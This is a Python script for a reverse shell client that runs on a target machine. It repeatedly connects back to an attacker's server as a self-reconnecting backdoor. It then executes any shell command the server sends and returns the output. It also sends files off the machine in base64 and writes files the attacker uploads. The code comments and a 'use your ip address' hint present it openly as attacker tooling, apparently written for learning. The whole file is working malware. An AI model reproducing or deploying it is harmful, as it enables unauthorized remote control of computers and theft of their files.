# Reverse shell client (runs on target machine)
# This script connects to the attacker's server and listens for incoming commands. Once connected


import socket
import json
import subprocess #  to run system shell commands
import os #  for directory operations
import base64
import time


# Keeps trying to connect to the attacker every 5 seconds until it succeeds.
# Simulates a "persistent" backdoor that auto-reconnects.
def server(ip, port):
    global connection
    connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    while True:
        try:
            connection.connect((ip, port))
            break
        except ConnectionRefusedError:
            time.sleep(5)

# Sends JSON data over the socket (same as server side).
def send(data):
    json_data = json.dumps(data)
    connection.send(json_data.encode('utf-8'))

# Receives and decodes JSON commands from the server.
def recieve():
    json_data = ''
    while True:
        try:
            json_data += connection.recv(1024).decode('utf-8')
            return json.loads(json_data)
        except ValueError:
            continue

def run():
    while True:
        command = recieve()
        if command == 'exit':
            break
        elif command[:2] == 'cd' and len(command) > 1: #  Changes current directory on the client.
            os.chdir(command[3:])
        elif command [:8] == 'download':
            with open(command[9:], 'rb') as f: #  Reads the requested file, encodes in base64, and sends it back.
                send(base64.b64encode(f.read()).decode('utf-8'))
        elif command[:6] == 'upload': #  Receives a file from the server, decodes it, and saves it locally.
            with open(command[7:], 'wb') as f:
                file_data = recieve()
                f.write(base64.b64decode(file_data))
        else: # Runs any normal shell command (e.g., ls, whoami, ipconfig) and sends back the output:
            # Uses Popen() to execute the command, Captures stdout and stderr (errors), Sends the result to the server.
            process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE, universal_newlines=True)
            result = process.stdout.read() + process.stderr.read()
            send(result)

server('127.0.0.1', 4444) # use your ip address
run()